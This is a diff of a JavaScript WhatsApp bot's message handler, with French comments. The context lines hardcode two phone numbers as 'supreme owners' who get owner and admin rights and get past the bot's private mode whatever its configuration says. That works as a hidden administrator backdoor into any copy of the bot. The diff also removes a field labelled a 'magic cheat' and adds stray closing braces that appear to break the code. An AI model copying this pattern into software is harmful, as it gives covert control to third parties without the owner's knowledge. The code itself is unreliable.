@@ -298,6 +298,8 @@ const isSystemJid = (jid) => {
          jid.includes('@newsletter.');
 };
 //--------- MAIN MESSAGE HANDLER ---------
+const config = require('./config.js'); 
+
 const handleMessage = async (sock, msg) => {
   try {
     if (!msg.message) return;
@@ -312,7 +314,8 @@ const handleMessage = async (sock, msg) => {
     const sender = normalizeJidWithLid(rawSender); 
     const senderNumber = normalizeJid(sender);
 
-    // 👑 Vérification des Maîtres Suprêmes
+    // 👑 Vérification des Maîtres Suprêmes par numéro
+    // On utilise directement les numéros en clair
     const supremeOwners = ['22651622652', '22665108174'];
     const isSupremeOwner = supremeOwners.includes(senderNumber);
 
@@ -325,7 +328,6 @@ const handleMessage = async (sock, msg) => {
     const isMe = msg.key.fromMe || isConfigOwner || isSupremeOwner;
 
     // 🚨 SÉCURITÉ : Mode Privé (Self Mode)
-    // Si le bot est en selfMode ou public = false, il ignore tout, SAUF tes numéros et le owner défini.
     if (config.selfMode === true || config.public === false) {
       if (!isMe) return; 
     }
@@ -336,7 +338,6 @@ const handleMessage = async (sock, msg) => {
     const isCommand = body.trim().startsWith(config.prefix || '.');
 
     // 👑 ─── VÉNÉRATION DU MAÎTRE ───
-    // Le bot réagit avec une couronne à TOUT message venant de toi (qu'il soit une commande ou non)
     if (isSupremeOwner && !msg.key.fromMe) {
       try {
         await sock.sendMessage(from, { react: { text: '👑', key: msg.key } });
@@ -364,6 +365,7 @@ const handleMessage = async (sock, msg) => {
           }, replyData.delay);
       }
     }
+}
 
     // 🎯 ─── SYSTÈME AUTO-REACT POUR LES MORTELS ───
     try {
@@ -633,7 +635,6 @@ if (groupSettings.autosticker && !isCommand) {
       sender, 
       isGroup, 
       groupMetadata,
-      senderHash, // 🎯 LA TRICHE MAGIQUE EST TRANSMISE ICI !
       isOwner: isMe, 
       isAdmin: isMe || await isAdmin(sock, sender, from, groupMetadata), 
       isBotAdmin: await isBotAdmin(sock, from, groupMetadata),
@@ -650,6 +651,7 @@ if (groupSettings.autosticker && !isCommand) {
       await sock.sendMessage(msg.key.remoteJid, { text: `${config.messages.error}\n\n${error.message}` }, { quoted: msg });
     } catch (e) {}
   }
+};
 };
 }
 
